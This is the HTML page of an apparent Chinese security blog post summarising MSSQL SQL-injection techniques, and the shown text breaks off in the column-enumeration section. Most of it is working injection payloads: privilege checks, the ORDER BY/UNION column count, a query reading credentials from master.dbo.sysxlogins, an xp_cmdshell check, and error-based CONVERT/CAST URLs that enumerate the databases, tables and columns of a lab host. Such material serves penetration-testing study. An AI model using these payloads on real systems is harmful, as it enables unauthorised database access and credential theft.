@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Mssql注入总结基础知识默认数据库   pubs 不适用于MSSQL 2005    model 适用于所有版本   msdb 适用于所有版本   tempdb 适用于所有版本   northwind 适用于所有版本   information_schema 适用于MSSQL 2000及更高版本   注释&#x2F;*--;00% 空白字符01,02,03,04,05,06,07,08,09,0A,0B,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mssql注入小结">
+<meta property="og:url" content="http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/index.html">
+<meta property="og:site_name" content="ceeeeeeb&#39;s blog">
+<meta property="og:description" content="Mssql注入总结基础知识默认数据库   pubs 不适用于MSSQL 2005    model 适用于所有版本   msdb 适用于所有版本   tempdb 适用于所有版本   northwind 适用于所有版本   information_schema 适用于MSSQL 2000及更高版本   注释&#x2F;*--;00% 空白字符01,02,03,04,05,06,07,08,09,0A,0B,">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-03-18T05:35:11.000Z">
+<meta property="article:modified_time" content="2020-03-18T05:35:30.219Z">
+<meta property="article:author" content="ceeeeeeb">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>mssql注入小结</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/03/16/cdn%E8%AF%86%E5%88%AB%E4%B8%8E%E7%BB%95%E8%BF%87/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/&text=mssql注入小结" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/&title=mssql注入小结" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/&is_video=false&description=mssql注入小结" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=mssql注入小结&body=Check out this article: http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/&title=mssql注入小结" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/&title=mssql注入小结" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/&title=mssql注入小结" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/&title=mssql注入小结" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/&name=mssql注入小结&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/03/18/mssql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/&t=mssql注入小结" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Mssql注入总结"><span class="toc-number">1.</span> <span class="toc-text">Mssql注入总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识"><span class="toc-number">1.1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#默认数据库"><span class="toc-number">1.1.1.</span> <span class="toc-text">默认数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注释"><span class="toc-number">1.1.2.</span> <span class="toc-text">注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#空白字符"><span class="toc-number">1.1.3.</span> <span class="toc-text">空白字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#权限判断"><span class="toc-number">1.1.4.</span> <span class="toc-text">权限判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常用信息"><span class="toc-number">1.1.5.</span> <span class="toc-text">常用信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#表和列个数"><span class="toc-number">1.1.6.</span> <span class="toc-text">表和列个数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数据库凭据"><span class="toc-number">1.1.7.</span> <span class="toc-text">数据库凭据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入"><span class="toc-number">1.2.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用函数"><span class="toc-number">1.2.1.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断xp-cmdshell是否存在"><span class="toc-number">1.2.2.</span> <span class="toc-text">判断xp_cmdshell是否存在</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断是否为sa"><span class="toc-number">1.2.3.</span> <span class="toc-text">判断是否为sa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断是否为db-ownwer"><span class="toc-number">1.2.4.</span> <span class="toc-text">判断是否为db_ownwer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数据库机器名"><span class="toc-number">1.2.5.</span> <span class="toc-text">数据库机器名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆数据库版本"><span class="toc-number">1.2.6.</span> <span class="toc-text">爆数据库版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#当前数据库用户名"><span class="toc-number">1.2.7.</span> <span class="toc-text">当前数据库用户名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取数据库名"><span class="toc-number">1.2.8.</span> <span class="toc-text">获取数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取当前数据库名"><span class="toc-number">1.2.9.</span> <span class="toc-text">获取当前数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取表个数"><span class="toc-number">1.2.10.</span> <span class="toc-text">获取表个数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取所有表名"><span class="toc-number">1.2.11.</span> <span class="toc-text">获取所有表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看表中有多少数据"><span class="toc-number">1.2.12.</span> <span class="toc-text">查看表中有多少数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取所有列名"><span class="toc-number">1.2.13.</span> <span class="toc-text">获取所有列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取当前表名，列名"><span class="toc-number">1.2.14.</span> <span class="toc-text">获取当前表名，列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#列数据"><span class="toc-number">1.2.15.</span> <span class="toc-text">列数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#带括号"><span class="toc-number">1.2.16.</span> <span class="toc-text">带括号</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#union注入"><span class="toc-number">1.3.</span> <span class="toc-text">union注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#盲注"><span class="toc-number">1.4.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#布尔盲注"><span class="toc-number">1.4.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#时间盲注"><span class="toc-number">1.4.2.</span> <span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查询管理员信息"><span class="toc-number">1.5.</span> <span class="toc-text">查询管理员信息</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        mssql注入小结
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ceeeeeeb</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-18T05:35:11.000Z" itemprop="datePublished">2020-03-18</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="Mssql注入总结"><a href="#Mssql注入总结" class="headerlink" title="Mssql注入总结"></a>Mssql注入总结</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="默认数据库"><a href="#默认数据库" class="headerlink" title="默认数据库"></a>默认数据库</h3><table>
+<thead>
+<tr>
+<th>pubs</th>
+<th>不适用于MSSQL 2005</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>model</td>
+<td>适用于所有版本</td>
+</tr>
+<tr>
+<td>msdb</td>
+<td>适用于所有版本</td>
+</tr>
+<tr>
+<td>tempdb</td>
+<td>适用于所有版本</td>
+</tr>
+<tr>
+<td>northwind</td>
+<td>适用于所有版本</td>
+</tr>
+<tr>
+<td>information_schema</td>
+<td>适用于MSSQL 2000及更高版本</td>
+</tr>
+</tbody></table>
+<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">/<span class="strong">*</span></span><br><span class="line"><span class="strong">--</span></span><br><span class="line"><span class="strong">;00%</span></span><br></pre></td></tr></table></figure>
+<h3 id="空白字符"><a href="#空白字符" class="headerlink" title="空白字符"></a>空白字符</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">01</span>,<span class="number">02</span>,<span class="number">03</span>,<span class="number">04</span>,<span class="number">05</span>,<span class="number">06</span>,<span class="number">07</span>,<span class="number">08</span>,<span class="number">09</span>,<span class="number">0</span>A,<span class="number">0</span>B,<span class="number">0</span>C,<span class="number">0</span>D,<span class="number">0</span>E,<span class="number">0</span>F,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">1</span>A,<span class="number">1</span>B,<span class="number">1</span>C,<span class="number">1</span>D,<span class="number">1</span>E,<span class="number">1</span>F,<span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**/</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="权限判断"><a href="#权限判断" class="headerlink" title="权限判断"></a>权限判断</h3><p>服务器级别</p>
+<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">and <span class="number">1</span>=(<span class="name">select</span> is_srvrolemember('sysadmin'))</span><br><span class="line">and <span class="number">1</span>=(<span class="name">select</span> is_srvrolemember('serveradmin'))</span><br><span class="line">and <span class="number">1</span>=(<span class="name">select</span> is_srvrolemember('setupadmin'))</span><br><span class="line">and <span class="number">1</span>=(<span class="name">select</span> is_srvrolemember('securityadmin'))</span><br><span class="line">and <span class="number">1</span>=(<span class="name">select</span> is_srvrolemember('diskadmin'))</span><br><span class="line">and <span class="number">1</span>=(<span class="name">select</span> is_srvrolemember('bulkadmin'))</span><br></pre></td></tr></table></figure>
+<p>数据库级别</p>
+<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">select</span> <span class="function"><span class="title">IS_MEMBER</span>(<span class="string">'db_owner'</span>)</span></span><br></pre></td></tr></table></figure>
+<h3 id="常用信息"><a href="#常用信息" class="headerlink" title="常用信息"></a>常用信息</h3><figure class="highlight less"><table><tr><td class="code"><pre><span class="line">@<span class="variable">@VERSION</span></span><br><span class="line"><span class="variable">@@servername</span></span><br><span class="line">suser_sname())</span><br><span class="line">user  <span class="comment">//获取当前数据库用户名</span></span><br><span class="line">db_name() <span class="comment">// 当前数据库名 其中db_name(N)可以来遍历其他数据库</span></span><br><span class="line">;<span class="selector-tag">select</span> <span class="selector-tag">user</span> <span class="comment">//查询是否支持多语句</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="表和列个数"><a href="#表和列个数" class="headerlink" title="表和列个数"></a>表和列个数</h3><table>
+<thead>
+<tr>
+<th>1’ ORDER BY 1–</th>
+<th>True</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1’ ORDER BY 2–</td>
+<td>True</td>
+</tr>
+<tr>
+<td>1’ ORDER BY 3–</td>
+<td>True</td>
+</tr>
+<tr>
+<td>1’ ORDER BY 4–</td>
+<td>False  - 列数为3</td>
+</tr>
+<tr>
+<td>-1’ UNION SELECT 1,2,3–</td>
+<td>True</td>
+</tr>
+</tbody></table>
+<p>附： 不断递增的列数，直到得到一个错误的响应。</p>
+<h3 id="数据库凭据"><a href="#数据库凭据" class="headerlink" title="数据库凭据"></a>数据库凭据</h3><table>
+<thead>
+<tr>
+<th>数据库表</th>
+<th>master..syslogins, master..sysprocesses</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>列名</td>
+<td>name, loginame</td>
+</tr>
+<tr>
+<td>当前用户</td>
+<td>user, system_user, suser_sname(), is_srvrolemember(‘sysadmin’)</td>
+</tr>
+<tr>
+<td>数据库凭据</td>
+<td>SELECT user, password FROM master.dbo.sysxlogins</td>
+</tr>
+</tbody></table>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><p>显示转换也就是利用函数来转换，我们经常用到的两个函数就是cast和convert</p>
+<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">CAST( <span class="name">expression</span> AS data_type )</span><br><span class="line"></span><br><span class="line">CONVERT(<span class="name">data_type</span>[(<span class="name">length</span>)], expression [, style])</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> =<span class="number">1</span> (<span class="keyword">select</span> <span class="keyword">CAST</span>(<span class="keyword">USER</span> <span class="keyword">as</span> <span class="built_in">int</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> =<span class="number">1</span> (<span class="keyword">select</span> <span class="keyword">convert</span>(<span class="built_in">int</span>,<span class="keyword">user</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="判断xp-cmdshell是否存在"><a href="#判断xp-cmdshell是否存在" class="headerlink" title="判断xp_cmdshell是否存在"></a>判断xp_cmdshell是否存在</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.189.128:8001/less-1.asp?id=1' and 1=(<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> master..sysobjects <span class="keyword">where</span> xtype = <span class="string">'x'</span> <span class="keyword">and</span> <span class="keyword">name</span> = <span class="string">'xp_cmdshell'</span>) <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<h3 id="判断是否为sa"><a href="#判断是否为sa" class="headerlink" title="判断是否为sa"></a>判断是否为sa</h3><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">189.128</span>:<span class="number">8001</span>/less-<span class="number">1</span>.asp?id=<span class="number">1</span>' <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(<span class="keyword">SELECT</span> is_srvrolemember(<span class="symbol">'sysadmin</span>')))<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="判断是否为db-ownwer"><a href="#判断是否为db-ownwer" class="headerlink" title="判断是否为db_ownwer"></a>判断是否为db_ownwer</h3><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">189.128</span>:<span class="number">8001</span>/less-<span class="number">1</span>.asp?id=<span class="number">1</span>' <span class="keyword">and</span> <span class="number">1</span>=convert(int,(<span class="keyword">select</span> IS_MEMBER(<span class="symbol">'db_owner</span>')))<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="数据库机器名"><a href="#数据库机器名" class="headerlink" title="数据库机器名"></a>数据库机器名</h3><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">189.128</span>:<span class="number">8001</span>/less-<span class="number">1</span>.asp?id=<span class="number">1</span>' <span class="keyword">and</span> <span class="number">1</span>=convert(int,(<span class="keyword">select</span> @@servername))<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="爆数据库版本"><a href="#爆数据库版本" class="headerlink" title="爆数据库版本"></a>爆数据库版本</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.189</span><span class="number">.128</span>:<span class="number">8001</span>/less<span class="number">-1.</span>asp?id=<span class="number">1</span><span class="string">' and 1=(select @@VERSION) --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://192.168.189.128:8001/less-1.asp?id=1'</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(<span class="type">int</span>,(<span class="keyword">select</span> @@<span class="keyword">VERSION</span>))<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>无回显时</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.189.128:8001/less-1.asp?id=1' and substring((<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">22</span>,<span class="number">4</span>)=<span class="string">'20s08'</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<h3 id="当前数据库用户名"><a href="#当前数据库用户名" class="headerlink" title="当前数据库用户名"></a>当前数据库用户名</h3><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">189.128</span>:<span class="number">8001</span>/less-<span class="number">1</span>.asp?id=<span class="number">1</span>' <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(<span class="keyword">select</span> suser_sname()))<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">req爆数据库，1-5分别为：“master”，“msdb”，“mssqlweb”，“empdb”，“model”</span><br><span class="line"></span><br><span class="line">http://192.168.189.128:8001/less-1.asp?id=1' and 1=(<span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> master.dbo.sysdatabases <span class="keyword">where</span> dbid=<span class="number">7</span>)<span class="comment">--</span></span><br><span class="line"></span><br><span class="line">ver&gt;<span class="number">2005</span></span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.189</span><span class="number">.128</span>:<span class="number">8001</span>/<span class="keyword">less</span><span class="number">-1.</span>asp?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(''))--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://192.168.189.128:8001/less-1.asp?id=1'</span>  <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="string">'|'</span>%<span class="number">2</span>bname%<span class="number">2</span>b<span class="string">'|'</span> <span class="keyword">from</span> master..sysdatabases <span class="keyword">FOR</span> <span class="keyword">XML</span> <span class="keyword">PATH</span>(<span class="string">''</span>))<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<h3 id="获取当前数据库名"><a href="#获取当前数据库名" class="headerlink" title="获取当前数据库名"></a>获取当前数据库名</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.189.128:8001/less-1.asp?id=1' and 1=CONVERT(int,(<span class="keyword">select</span> db_name()))<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.189</span><span class="number">.128</span>:<span class="number">8001</span>/<span class="keyword">less</span><span class="number">-1.</span>asp?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and 1=CONVERT(int,(select db_name(2)))--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://192.168.189.128:8001/less-1.asp?id=1'</span> <span class="keyword">and</span> db_name()&gt;<span class="number">0</span>;<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<h3 id="获取表个数"><a href="#获取表个数" class="headerlink" title="获取表个数"></a>获取表个数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.189.128:8001/less-1.asp?id=1' AND 1=CONVERT(INT,(CHAR(58)%2bCHAR(58)%2b(<span class="keyword">SELECT</span> top <span class="number">1</span> <span class="keyword">CAST</span>(<span class="keyword">COUNT</span>(*) <span class="keyword">AS</span> <span class="keyword">nvarchar</span>(<span class="number">4000</span>)) <span class="keyword">FROM</span> information_schema.TABLES )%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)))<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="获取所有表名"><a href="#获取所有表名" class="headerlink" title="获取所有表名"></a>获取所有表名</h3><p>用not in条件，把每次查出来的表名都加进去</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.189</span><span class="number">.128</span>:<span class="number">8001</span>/less<span class="number">-1.</span>asp?id=<span class="number">1</span><span class="string">' and 1=convert(int,(select top 1 table_name from information_schema.tables ))--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://192.168.189.128:8001/less-1.asp?id=1'</span> <span class="keyword">and</span> <span class="number">1</span>=convert(<span class="type">int</span>,(<span class="keyword">select</span> top <span class="number">1</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> <span class="built_in">table_name</span> <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'emails'</span>,<span class="string">'uagents'</span>) ))<span class="comment">--</span></span><br><span class="line"></span><br><span class="line">http://<span class="number">192.168</span><span class="number">.189</span><span class="number">.128</span>:<span class="number">8001</span>/less<span class="number">-1.</span>asp?id=<span class="number">1</span><span class="string">' and 1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in('</span>emails<span class="string">','</span>uagents<span class="string">','</span>referers<span class="string">') ))--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://192.168.189.128:8001/less-1.asp?id=1'</span> <span class="keyword">and</span> <span class="number">1</span>=convert(<span class="type">int</span>,(<span class="keyword">select</span> top <span class="number">1</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> <span class="built_in">table_name</span> <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'emails'</span>,<span class="string">'uagents'</span>,<span class="string">'referers'</span>,<span class="string">'users'</span>) ))<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.189.128:8001/less-1.asp?id=1' and 1=convert(int,(<span class="keyword">select</span> top <span class="number">1</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_catalog=<span class="string">'test'</span>))<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.189.128:8001/less-1.asp?id=1' and 1=(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype=<span class="string">'u'</span> <span class="keyword">and</span> <span class="keyword">name</span> !=<span class="string">'info'</span>);<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查看表中有多少数据"><a href="#查看表中有多少数据" class="headerlink" title="查看表中有多少数据"></a>查看表中有多少数据</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.189.128:8001/less-1.asp?id=1' AND 1=CONVERT(INT,(CHAR(58)%2bCHAR(58)%2b(<span class="keyword">SELECT</span> top <span class="number">1</span> <span class="keyword">CAST</span>(<span class="keyword">COUNT</span>(*) <span class="keyword">AS</span> <span class="keyword">nvarchar</span>(<span class="number">4000</span>)) <span class="keyword">FROM</span> <span class="keyword">users</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)))<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="获取所有列名"><a href="#获取所有列名" class="headerlink" title="获取所有列名"></a>获取所有列名</h3><p>同样用not in条件</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.189</span><span class="number">.128</span>:<span class="number">8001</span>/less<span class="number">-1.</span>asp?id=<span class="number">1</span><span class="string">' and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name='</span>users<span class="string">'))--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://192.168.189.128:8001/less-1.asp?id=1'</span> <span class="keyword">and</span> <span class="number">1</span>=convert(<span class="type">int</span>,(<span class="keyword">select</span> top <span class="number">1</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'users'</span> <span class="keyword">and</span> <span class="built_in">column_name</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">'id'</span>,<span class="string">'username'</span>,<span class="keyword">password</span>)))<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.189.128:8001/less-1.asp?id=1' and 1=(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> syscolumns <span class="keyword">where</span> <span class="keyword">id</span>=(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">'users'</span>) <span class="keyword">and</span> <span class="keyword">name</span>&lt;&gt;<span class="string">'id'</span>);<span class="comment">--</span></span><br></pre></td></tr></table></figure>
